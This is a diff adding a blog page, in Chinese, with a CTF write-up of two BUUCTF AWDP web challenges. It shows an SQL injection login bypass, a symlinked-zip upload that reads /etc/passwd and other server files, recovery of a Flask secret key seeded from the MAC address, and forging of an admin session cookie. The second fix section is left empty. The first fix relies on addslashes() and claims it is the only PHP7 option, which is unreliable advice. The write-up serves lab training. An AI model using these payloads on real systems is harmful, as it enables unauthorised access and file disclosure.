@@ -1,0 +1,503 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>BUUCTF awdp加固题 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="BUUCTF awdp加固题" />
+<meta property="og:description" content="两道awdp-web加固题" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/buuctf_reinforce_wp/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:00:00+08:00" />
+<meta property="article:modified_time" content="2023-12-17T15:38:11+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="BUUCTF awdp加固题"/>
+<meta name="twitter:description" content="两道awdp-web加固题"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/buuctf_reinforce_wp/" /><link rel="prev" href="http://scofield1920.github.io/ctfhub--info_leakage/" /><link rel="next" href="http://scofield1920.github.io/git/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "BUUCTF awdp加固题",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/buuctf_reinforce_wp\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "web, awdp","wordcount":  145 ,
+        "url": "http:\/\/scofield1920.github.io\/buuctf_reinforce_wp\/","datePublished": "2023-11-17T00:00:00+08:00","dateModified": "2023-12-17T15:38:11+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ezsql">[Ezsql]</a>
+      <ul>
+        <li><a href="#1break">1.break</a></li>
+        <li><a href="#2fix">2.fix</a></li>
+      </ul>
+    </li>
+    <li><a href="#babypython">[babypython]</a>
+      <ul>
+        <li><a href="#1break-1">1.break</a></li>
+        <li><a href="#2fix-1">2.fix</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">BUUCTF awdp加固题</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/awdp/"><i class="far fa-folder fa-fw"></i>awdp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-12-17">2023-12-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;145 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ezsql">[Ezsql]</a>
+      <ul>
+        <li><a href="#1break">1.break</a></li>
+        <li><a href="#2fix">2.fix</a></li>
+      </ul>
+    </li>
+    <li><a href="#babypython">[babypython]</a>
+      <ul>
+        <li><a href="#1break-1">1.break</a></li>
+        <li><a href="#2fix-1">2.fix</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>两道awdp-web加固题</p>
+<h2 id="ezsql" class="headerLink">
+    <a href="#ezsql" class="header-mark"></a>[Ezsql]</h2><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616161943315.png" title="image-20230616161943315" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616161943315.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616161943315.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616161943315.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616161943315.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616161943315.png 2x"
+            sizes="auto"
+            alt="image-20230616161943315">
+    </a></figure></p>
+<h3 id="1break" class="headerLink">
+    <a href="#1break" class="header-mark"></a>1.break</h3><p>首先进入靶机web页面</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162115816.png" title="image-20230616162115816" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162115816.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162115816.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162115816.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162115816.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162115816.png 2x"
+            sizes="auto"
+            alt="image-20230616162115816">
+    </a></figure></p>
+<p>猜了弱口令都不对，尝试sql万能密码成功登录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">用户名：admin&#39; or 1=1#
+</span></span><span class="line"><span class="cl">密码：(填不填都行，填啥也行)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>题目要求对页面存在的sql注入漏洞进行加固，即可取得flag</p>
+<h3 id="2fix" class="headerLink">
+    <a href="#2fix" class="header-mark"></a>2.fix</h3><p>根据题目给的地址端口以及用户名，ssh连接至靶机，进入/var/www/html/目录</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162754875.png" title="image-20230616162754875" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162754875.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162754875.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162754875.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162754875.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162754875.png 2x"
+            sizes="auto"
+            alt="image-20230616162754875">
+    </a></figure></p>
+<p>在此处新建一个phpinfo.php并写入语句</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php phpinfo(); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205637225.png" title="image-20230616205637225" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205637225.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205637225.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205637225.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205637225.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205637225.png 2x"
+            sizes="auto"
+            alt="image-20230616205637225">
+    </a></figure></p>
+<p>访问phpinfo.php可以看到当前php版本为7.3.18</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205717499.png" title="image-20230616205717499" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205717499.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205717499.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205717499.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205717499.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205717499.png 2x"
+            sizes="auto"
+            alt="image-20230616205717499">
+    </a></figure></p>
+<p>php中防止sql注入的函数无非就那么几个：（我所知道的）</p>
+<p>addslashes()</p>
+<p>mysql_real_escape_string() 在php5.5中已经弃用，并在php7中被删除</p>
+<p>mysql_escape_string() PHP 4 &gt;= 4.0.3, PHP 5</p>
+<p>在PHP7中，能用的只有addslashes()</p>
+<p>故应在index.php中添加以下代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$username = addslashes($username);
+</span></span><span class="line"><span class="cl">$password = addslashes($password);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>添加在此处：</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210551430.png" title="image-20230616210551430" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210551430.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210551430.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210551430.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210551430.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210551430.png 2x"
+            sizes="auto"
+            alt="image-20230616210551430">
+    </a></figure></p>
+<p>随后进入check服务器/check目录进行check
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210742088.png" title="image-20230616210742088" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210742088.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210742088.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210742088.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210742088.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210742088.png 2x"
+            sizes="auto"
+            alt="image-20230616210742088">
+    </a></figure></p>
+<p>通过之后访问/flag得到flag字符串</p>
+<h2 id="babypython" class="headerLink">
+    <a href="#babypython" class="header-mark"></a>[babypython]</h2><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215912341.png" title="image-20230616215912341" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215912341.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215912341.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215912341.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215912341.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215912341.png 2x"
+            sizes="auto"
+            alt="image-20230616215912341">
+    </a></figure></p>
+<h3 id="1break-1" class="headerLink">
+    <a href="#1break-1" class="header-mark"></a>1.break</h3><p>进入靶机web页面，是个上传界面，经过尝试后发现只能上传zip文件，猜测是通过上传软链接的压缩包来读取相关信息（压缩一个软链接，类似于windows下的快捷方式，然后网站后台会解压读取该软链接指向的服务器上的文件，就能达到读取任意文件的效果。）
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215852903.png" title="image-20230616215852903" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215852903.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215852903.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215852903.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215852903.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215852903.png 2x"
+            sizes="auto"
+            alt="image-20230616215852903">
+    </a></figure></p>
+<p>在Linux环境下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ln -s /etc/passwd passwd
+</span></span><span class="line"><span class="cl">zip -y passwd.zip passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成了一个读取**/etc/passwd<strong>的zip软链接</strong>
+随后上传我们得到的压缩包passwd.zip便可以在web页面看到回显的passwd文件信息</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616221815139.png" title="image-20230616221815139" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616221815139.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616221815139.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616221815139.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616221815139.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616221815139.png 2x"
+            sizes="auto"
+            alt="image-20230616221815139">
+    </a></figure></p>
+<p>再来读取下<strong>app/uwsgi.ini</strong></p>
+<blockquote>
+<p>uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管理及应用监控等功能。它支持WSGI协议，同时它也支持自有的uWSGI协议</p>
+</blockquote>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222232148.png" title="image-20230616222232148" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222232148.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222232148.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222232148.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222232148.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222232148.png 2x"
+            sizes="auto"
+            alt="image-20230616222232148">
+    </a></figure></p>
+<p>读一下**/app/main.py**</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222907980.png" title="image-20230616222907980" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222907980.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222907980.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222907980.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222907980.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222907980.png 2x"
+            sizes="auto"
+            alt="image-20230616222907980">
+    </a></figure></p>
+<p>最终找到源码文件：<em>/app/y0u_found_it/y0u_found_main.py</em></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616232950895.png" title="image-20230616232950895" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616232950895.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616232950895.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616232950895.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616232950895.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616232950895.png 2x"
+            sizes="auto"
+            alt="image-20230616232950895">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app.config[‘SECRET_KEY’] = str(random.random()*100)
+</span></span><span class="line"><span class="cl">random.seed(uuid.getnode())	设置随机数种子操作。
+</span></span><span class="line"><span class="cl">python random				生成的数是伪随机数
+</span></span><span class="line"><span class="cl">uuid.getnode()				这个函数可以获取网卡mac地址并转换成十进制数返回
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过读<code>/sys/class/net/eth0/address</code>文件得到mac地址，于是构造软链接、生成zip、上传看返回结果。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616235529631.png" title="image-20230616235529631" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616235529631.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616235529631.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616235529631.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616235529631.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616235529631.png 2x"
+            sizes="auto"
+            alt="image-20230616235529631">
+    </a></figure></p>
+<p>然后就是把mac地址处理下，转换成二进制，然后设置成seed，生成一下KEY</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import uuid
+</span></span><span class="line"><span class="cl">import random
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mac = &#34;c6:98:94:10:39:c6&#34;
+</span></span><span class="line"><span class="cl">temp = mac.split(&#39;:&#39;)					#去掉&#34;:&#34;
+</span></span><span class="line"><span class="cl">temp = [int(i,16) for i in temp]		#遍历mac
+</span></span><span class="line"><span class="cl">temp = [bin(i).replace(&#39;0b&#39;,&#39;&#39;).zfill(8) for i in temp]	#十六进制转二
+</span></span><span class="line"><span class="cl">temp = &#39;&#39;.join(temp)					#得到的值赋给temp
+</span></span><span class="line"><span class="cl">mac = int(temp,2)
+</span></span><span class="line"><span class="cl">random.seed(mac)						#将mac作为种子
+</span></span><span class="line"><span class="cl">randStr = str(random.random()*100)
+</span></span><span class="line"><span class="cl">print(randStr)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到KEY:68.61339598479617</p>
+<p>同时根据页面提示，只有admin才能获得flag，尝试通过伪造session来伪造admin身份用<strong>flask-session-cookie-manager</strong>伪造session</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\Scofield_Lee\Desktop\flask-session-cookie-manager&gt;python flask_session_cookie_manager3.py encode -s &#39;68.61339598479617&#39; -t &#34;{&#39;username&#39;: &#39;admin&#39;}&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">eyJ1c2VybmFtZSI6ImFkbWluIn0.ZIyJeg.8rUFY72cFh1JQAALMZKX79N3j2w
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到session：<code>eyJ1c2VybmFtZSI6ImFkbWluIn0.ZIyJeg.8rUFY72cFh1JQAALMZKX79N3j2w</code></p>
+<h3 id="2fix-1" class="headerLink">
+    <a href="#2fix-1" class="header-mark"></a>2.fix</h3><p>。。。。。</p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-17&nbsp;<a class="git-hash" href="https://github.com/HEIGE-PCloud/DoIt/commit/969375dd70cd7acbf2e549364429ffcb642588c5" target="_blank" title="commit by scofield(scofield_1920@outlook.com) 969375dd70cd7acbf2e549364429ffcb642588c5: data" rel="noopener noreferrer">
+                                    <i class="fas fa-hashtag fa-fw"></i>969375d</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/buuctf_reinforce_wp/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\BUUCTF_reinforce_wp.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\BUUCTF_reinforce_wp.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20BUUCTF+awdp%E5%8A%A0%E5%9B%BA%E9%A2%98&body=|Field|Value|%0A|-|-|%0A|Title|BUUCTF+awdp%E5%8A%A0%E5%9B%BA%E9%A2%98|%0A|Url|http://scofield1920.github.io/buuctf_reinforce_wp/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\BUUCTF_reinforce_wp.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
